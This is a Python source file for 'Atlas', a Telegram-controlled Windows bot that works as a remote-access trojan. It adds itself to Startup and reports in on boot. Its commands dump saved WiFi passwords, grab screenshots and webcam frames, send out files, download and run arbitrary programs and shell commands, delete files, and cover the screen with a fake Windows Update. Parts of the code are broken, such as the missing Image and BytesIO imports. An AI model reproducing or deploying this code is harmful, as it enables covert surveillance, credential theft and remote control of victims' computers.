import os
import sys
import shlex
import signal
import time
import asyncio
import shutil
import socket
import requests
import psutil
import platform
import subprocess
import cv2
import win32com.client
from datetime import datetime
from PIL import ImageGrab
from telegram import Update
from win11toast import notify
import ctypes
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ---------- PY SCRIPT CONTROL ----------
current_py = None      # subprocess.Popen
current_script = None  
# --------------------------------------

# ================= CONFIG =================
BOT_TOKEN = "000000000000000000000000000..."
OWNER_CHAT_ID = 00000000
POLL_INTERVAL = 15
ALERT_APPS = ["chrome.exe", "msedge.exe", "firefox.exe"]

monitor_enabled = False
monitor_task = None
last_battery = None
boot_time = psutil.boot_time()
# ==========================================
def send_boot_message():
    try:
        if OWNER_CHAT_ID is None:
            return  

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": OWNER_CHAT_ID,
            "text": "🔵 Atlas Windows Bot – Atlas Windows Running ."
        }
        requests.post(url, data=data)
    except Exception as e:
        print("Boot message error:", e)

# ---------- AUTO-STARTUP ----------
def add_to_startup():
    try:
        startup_path = os.path.join(
            os.environ["APPDATA"],
            r"Microsoft\Windows\Start Menu\Programs\Startup"
        )

        script_path = os.path.abspath(sys.argv[0])
        shortcut_path = os.path.join(startup_path, "Atlas-AutoStart.lnk")

        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.TargetPath = script_path
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.IconLocation = script_path
        shortcut.save()

        print("[✓] Auto-Startup ajouté avec succès !")

    except Exception as e:
        print(f"[!] Erreur Auto-Startup : {e}")



# ---------- HELPER FUNCTIONS ----------
def get_ip_info():
    try:
        local_ips = [
            snic.address
            for iface in psutil.net_if_addrs().values()
            for snic in iface
            if snic.family == socket.AF_INET and not snic.address.startswith("127.")
        ]
    except:
        local_ips = []

    try:
        public_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
    except:
        public_ip = "Unavailable"

    return local_ips, public_ip


def get_battery():
    try:
        b = psutil.sensors_battery()
        if b:
            return b.percent, b.power_plugged
    except:
        pass
    return None, None


def list_processes():
    procs = []
    for p in psutil.process_iter(["pid", "name"]):
        try:
            procs.append(f"{p.info['pid']} - {p.info['name']}")
        except:
            pass
    return procs[:80]


def get_startup_entries():
    entries = []
    if platform.system().lower().startswith("win"):
        import winreg
        keys = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
        ]
        for root, path in keys:
            try:
                key = winreg.OpenKey(root, path)
                i = 0
                while True:
                    name, val, _ = winreg.EnumValue(key, i)
                    entries.append(f"{name} => {val}")
                    i += 1
            except:
                pass
    return entries


def get_wifi_passwords():
    try:
        profiles_output = subprocess.check_output(
            "netsh wlan show profiles",
            shell=True,
            encoding="utf-8",
            errors="ignore"
        )
    except:
        return "❌ Failed to read WiFi profiles."

    wifi_names = []

    for line in profiles_output.splitlines():
        if any(x in line for x in ["All User Profile", "Profil Tous les utilisateurs", "Profil utilisateur"]):
            parts = line.split(":", 1)
            if len(parts) == 2:
                wifi_names.append(parts[1].strip())

    if not wifi_names:
        return "❌ No WiFi profiles found."

    result = ""
    for name in wifi_names:
        try:
            details = subprocess.check_output(
                f'netsh wlan show profile name="{name}" key=clear',
                shell=True,
                encoding="utf-8",
                errors="ignore"
            )

            password = "Unknown"

            for line in details.splitlines():
                clean_line = line.replace("\u00a0", " ").replace("\u202f", " ").strip()
                if "Key Content" in clean_line or "Contenu de la clé" in clean_line:
                    parts = clean_line.split(":", 1)
                    if len(parts) == 2:
                        password = parts[1].strip()

            result += f"📶 WiFi: {name}\n🔑 Password: {password}\n\n"

        except:
            result += f"📶 WiFi: {name}\n🔑 Password: Unknown (error)\n\n"

    return result.strip() if result else "❌ No WiFi passwords found."


def get_user_dirs():
    u = os.path.expanduser("~")
    return os.path.join(u, "Desktop"), os.path.join(u, "Downloads")



# ---------- AUTH ----------
def authorized(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if OWNER_CHAT_ID and update.effective_user.id != OWNER_CHAT_ID:
            await update.message.reply_text("Unauthorized.")
            return
        context.application.bot_data["last_chat_id"] = update.effective_chat.id
        return await func(update, context)
    return wrapper



# ---------- NEW COMMANDS ----------
@authorized
async def uptime_cmd(update, context):
    now = time.time()
    uptime = now - boot_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    await update.message.reply_text(f"⏳ Uptime: {hours}h {minutes}m")

@authorized
async def ram_cmd(update, context):
    mem = psutil.virtual_memory()
    await update.message.reply_text(
        f"💾 RAM:\nUsed: {mem.used // (1024*1024)} MB\n"
        f"Available: {mem.available // (1024*1024)} MB"
    )

@authorized
async def cpu_cmd(update, context):
    cpu = psutil.cpu_percent(interval=1)
    await update.message.reply_text(f"⚙️ CPU Usage: {cpu}%")

@authorized
async def create_file_cmd(update, context):
    try:
        text = update.message.text.replace("/create_file", "").strip()
        parts = text.split(" ", 1)

        if len(parts) < 2:
            await update.message.reply_text("Usage: /create_file path text")
            return

        path, content = parts
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)

        await update.message.reply_text(f"📝 File created:\n{path}")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

@authorized
async def delete_cmd(update, context):
    try:
        path = update.message.text.replace("/delete", "").strip()

        if not os.path.exists(path):
            await update.message.reply_text("❌ File not found.")
            return

        os.remove(path)
        await update.message.reply_text(f"🗑️ Deleted:\n{path}")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")



# ---------- ORIGINAL COMMANDS ----------
@authorized
async def start_cmd(update, context):
    await update.message.reply_text(
        "📌 Commands ⵣ 𝑨𝑻𝑳𝑨𝑺 ⵣ ⴰⵟⴰⵍⴰⵙ:\n\n"

        "🖥️ System\n"
        "/shutdown\n"
        "/restart\n"
        "/lock\n"
        "/running\n"
        "/monitor_on\n"
        "/monitor_off\n"
        "/startup\n\n"

        "🔧 Device Info\n"
        "/battery\n"
        "/cpu\n"
        "/ram\n"
        "/uptime\n\n"

        "🌐 Network\n"
        "/ip\n"
        "/wifi\n\n"

        "📁 Files\n"
        "/files\n"
        "/download filepath\n"
        "/download_url URL path\n"
        "/create_file\n"
        "/delete\n\n"

        "📸 Monitoring\n"
        "/screenshot\n"
        "/camera\n\n"

        "🎭 Fake & Visual\n"
        "/fake_update\n"
        "/set_wallpaper\n\n"

        "🔔 Notifications\n"
        "/notify\n"
        "/notify_ok\n\n"

        "⚙️ Program Execution\n"
        "/run_py\n"
        "/stop_py\n"
        "/run_program\n\n"

        "➡️ New:\n"
        "/uptime\n"
        "/ram\n"
        "/cpu\n"
        "/create_file\n"
        "/delete"
    )


@authorized
async def ip_cmd(update, context):
    local, public = get_ip_info()
    await update.message.reply_text(f"Local: {local}\nPublic: {public}")

@authorized
async def battery_cmd(update, context):
    p, plug = get_battery()
    await update.message.reply_text(f"Battery: {p}% | Plugged: {plug}")

@authorized
async def running_cmd(update, context):
    txt = "\n".join(list_processes())
    await update.message.reply_text(txt[:4000])

@authorized
async def startup_cmd(update, context):
    txt = "\n".join(get_startup_entries())
    await update.message.reply_text(txt[:4000])

@authorized
async def files_cmd(update, context):
    desk, down = get_user_dirs()
    d1 = os.listdir(desk) if os.path.exists(desk) else []
    d2 = os.listdir(down) if os.path.exists(down) else []
    out = "📁 Desktop:\n" + "\n".join(d1) + "\n\n📁 Downloads:\n" + "\n".join(d2)
    await update.message.reply_text(out[:4000])

@authorized
async def download_cmd(update, context):
    try:
        path = update.message.text.replace("/download", "").strip()
        if not os.path.exists(path):
            await update.message.reply_text("File not found.")
            return

        allowed = [
            ".txt", ".pdf", ".doc", ".docx", ".odt", ".rtf",
            ".xls", ".xlsx", ".csv",
            ".png", ".jpg", ".jpeg",
            ".mp4", ".mp3",
            ".zip", ".rar", ".7z",
            ".py", ".json", ".xml"
        ]

        ext = os.path.splitext(path)[1].lower()

        if ext not in allowed:
            await update.message.reply_text("File type not allowed.")
            return

        with open(path, "rb") as f:
            await update.message.reply_document(f)

    except Exception as e:
        await update.message.reply_text(str(e))

@authorized
async def screenshot_cmd(update, context):
    img = ImageGrab.grab()
    path = os.path.join(os.getenv("TEMP"), "screen.png")
    img.save(path)
    with open(path, "rb") as f:
        await update.message.reply_photo(f)
    os.remove(path)

@authorized
async def camera_cmd(update, context):
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cam.release()
        if not ret:
            await update.message.reply_text("Camera not available.")
            return
        path = os.path.join(os.getenv("TEMP"), "camera.png")
        cv2.imwrite(path, frame)
        with open(path, "rb") as f:
            await update.message.reply_photo(f)
        os.remove(path)
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

@authorized
async def wifi_cmd(update, context):
    await update.message.reply_text(get_wifi_passwords()[:4000])

@authorized
async def shutdown_cmd(update, context):
    os.system("shutdown /s /f /t 0")

@authorized
async def restart_cmd(update, context):
    os.system("shutdown /r /f /t 0")

@authorized
async def lock_cmd(update, context):
    os.system("rundll32.exe user32.dll,LockWorkStation")



# ---------- MONITOR ----------
async def monitor_loop(app):
    global monitor_enabled, last_battery
    while monitor_enabled:
        chat = app.bot_data.get("last_chat_id")
        if not chat:
            await asyncio.sleep(POLL_INTERVAL)
            continue
        p, _ = get_battery()
        if last_battery and p and abs(p - last_battery) >= 5:
            await app.bot.send_message(chat, f"Battery change: {p}%")
        last_battery = p
        run = " ".join(x.lower() for x in list_processes())
        for ap in ALERT_APPS:
            if ap.lower() in run:
                await app.bot.send_message(chat, f"⚠️ {ap} opened")
        await asyncio.sleep(POLL_INTERVAL)


@authorized
async def monitor_on_cmd(update, context):
    global monitor_enabled, monitor_task
    monitor_enabled = True
    monitor_task = asyncio.create_task(monitor_loop(context.application))
    await update.message.reply_text("Monitoring enabled.")

@authorized
async def monitor_off_cmd(update, context):
    global monitor_enabled, monitor_task
    monitor_enabled = False
    if monitor_task:
        monitor_task.cancel()
    await update.message.reply_text("Monitoring disabled.")

@authorized
async def notify_cmd(update, context):
    try:
        text = update.message.text.replace("/notify", "").strip()
        if not text:
            await update.message.reply_text("❗ Usage:\n/notify your message")
            return

        title = "Atlas Notification"

        # Windows toast
        notify(title=title, body=text)

        await update.message.reply_text("🔔 Notification sent!")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

@authorized
async def notify_ok_cmd(update, context):
    try:
        text = update.message.text.replace("/notify_ok", "").strip()
        if not text:
            await update.message.reply_text("❗ Usage:\n/notify_ok your message")
            return

        title = "Atlas Notification"

        # نافذة منبثقة تتطلب الضغط على OK
        ctypes.windll.user32.MessageBoxW(0, text, title, 0x40)

        await update.message.reply_text("🔔 Notification sent with OK dialog!")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

@authorized
async def download_url_cmd(update, context):
    try:
        text = update.message.text.replace("/download_url", "").strip()
        if not text:
            await update.message.reply_text("❗ Usage:\n/download_url URL path")
            return

        parts = text.split(" ", 1)
        if len(parts) < 2:
            await update.message.reply_text("❗ Usage:\n/download_url URL path")
            return

        url, path = parts
        response = requests.get(url, stream=True)
        if response.status_code != 200:
            await update.message.reply_text(f"❌ Failed to download. Status code: {response.status_code}")
            return

        with open(path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)

        await update.message.reply_text(f"✅ File downloaded successfully to:\n{path}")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

@authorized
async def run_program_cmd(update, context):
    try:
        text = update.message.text.replace("/run_program", "").strip()
        if not text:
            await update.message.reply_text("❗ Usage:\n/run program program_name_or_path")
            return

        # تشغيل البرنامج
        subprocess.Popen(text, shell=True)
        await update.message.reply_text(f"✅ Program started: {text}")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

@authorized
async def set_wallpaper_cmd(update, context):
    try:
        url = update.message.text.replace("/set_wallpaper", "").strip()
        if not url:
            await update.message.reply_text("❗ Usage:\n/set_wallpaper URL")
            return

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        response = requests.get(url, headers=headers, stream=True)
        if response.status_code != 200:
            await update.message.reply_text(f"❌ Failed to download image. Status: {response.status_code}")
            return

        # فتح الصورة من الذاكرة
        img = Image.open(BytesIO(response.content))
        bmp_path = BytesIO()
        img.save(bmp_path, format="BMP")  # Windows requires BMP format
        bmp_path.seek(0)

        # تغيير الخلفية مباشرة
        # نحتاج حفظ مؤقت في المسار المؤقت لأن ctypes يحتاج مسار فعلي
        import tempfile
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".bmp")
        img.save(temp_file.name, "BMP")
        ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_file.name, 3)

        await update.message.reply_text("🖼️ Wallpaper changed successfully!")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

@authorized
async def run_py_cmd(update, context):
    global current_py, current_script
    try:
        raw = update.message.text.replace("/run_py", "").strip()
        if not raw:
            await update.message.reply_text(
                "❗ Usage:\n/run_py FULL_PATH.py [args]"
            )
            return

        parts = shlex.split(raw)
        script_path = parts[0]
        args = parts[1:]

        if current_py and current_py.poll() is None:
            await update.message.reply_text("⚠️ A Python script is already running.")
            return

        if not os.path.isfile(script_path):
            await update.message.reply_text("❌ Script not found.")
            return

        current_py = subprocess.Popen(
            ["python", script_path, *args],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
        )
        current_script = script_path
        await update.message.reply_text(
            f"✅ Script started.\n📄 {os.path.basename(script_path)}\n🆔 PID: {current_py.pid}"
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

@authorized
async def stop_py_cmd(update, context):
    global current_py, current_script
    try:
        if not current_py or current_py.poll() is not None:
            await update.message.reply_text("ℹ️ No Python script is running.")
            current_py = None
            current_script = None
            return

        current_py.terminate()
        await update.message.reply_text(f"🛑 Script stopped:\n{os.path.basename(current_script)}")
        current_py = None
        current_script = None

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

@authorized
async def fake_update_cmd(update, context):
    import tkinter as tk
    import asyncio

    try:
        text = update.message.text.replace("/fake_update", "").strip()
        duration = int(text) if text.isdigit() else 30  # المدة بالثواني

        def show_update():
            root = tk.Tk()
            root.title("Windows Update")
            root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}")
            root.configure(bg="#0078D7")  # خلفية زرقاء
            root.attributes("-topmost", True)
            root.resizable(False, False)

            label = tk.Label(
                root, text="Installing updates\nPlease do not turn off your computer",
                font=("Segoe UI", 24), fg="white", bg="#0078D7"
            )
            label.place(relx=0.5, rely=0.5, anchor="center")

            root.after(duration * 1000, root.destroy)
            root.mainloop()

        await update.message.reply_text(f"✅ Fake update shown for {duration} seconds")
        await asyncio.to_thread(show_update)

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ---------- LAUNCH ----------
async def send_start_message(app):
    await asyncio.sleep(3)
    chat = app.bot_data.get("last_chat_id")
    if chat:
        await app.bot.send_message(chat, "Bot started successfully. Type /start.")

def main():

    add_to_startup()

    # إرسال رسالة بدء التشغيل
    if OWNER_CHAT_ID:
        send_boot_message()

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # original handlers
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("run_py", run_py_cmd))
    app.add_handler(CommandHandler("stop_py", stop_py_cmd))
    app.add_handler(CommandHandler("ip", ip_cmd))
    app.add_handler(CommandHandler("notify", notify_cmd))
    app.add_handler(CommandHandler("notify_ok", notify_ok_cmd))
    app.add_handler(CommandHandler("battery", battery_cmd))
    app.add_handler(CommandHandler("running", running_cmd))
    app.add_handler(CommandHandler("startup", startup_cmd))
    app.add_handler(CommandHandler("files", files_cmd))
    app.add_handler(CommandHandler("download", download_cmd))
    app.add_handler(CommandHandler("run_program", run_program_cmd))

    app.add_handler(CommandHandler("screenshot", screenshot_cmd))
    app.add_handler(CommandHandler("camera", camera_cmd))
    app.add_handler(CommandHandler("wifi", wifi_cmd))
    app.add_handler(CommandHandler("download_url", download_url_cmd))
    app.add_handler(CommandHandler("set_wallpaper", set_wallpaper_cmd))
    app.add_handler(CommandHandler("fake_update", fake_update_cmd))
    app.add_handler(CommandHandler("shutdown", shutdown_cmd))
    app.add_handler(CommandHandler("restart", restart_cmd))
    app.add_handler(CommandHandler("lock", lock_cmd))
    app.add_handler(CommandHandler("monitor_on", monitor_on_cmd))
    app.add_handler(CommandHandler("monitor_off", monitor_off_cmd))

    # NEW handlers
    app.add_handler(CommandHandler("uptime", uptime_cmd))
    app.add_handler(CommandHandler("ram", ram_cmd))
    app.add_handler(CommandHandler("cpu", cpu_cmd))
    app.add_handler(CommandHandler("create_file", create_file_cmd))
    app.add_handler(CommandHandler("delete", delete_cmd))

    app.post_init = send_start_message

    print("Atlas Windows Monitor Bot Running...")
    app.run_polling()


if __name__ == "__main__":
    main()
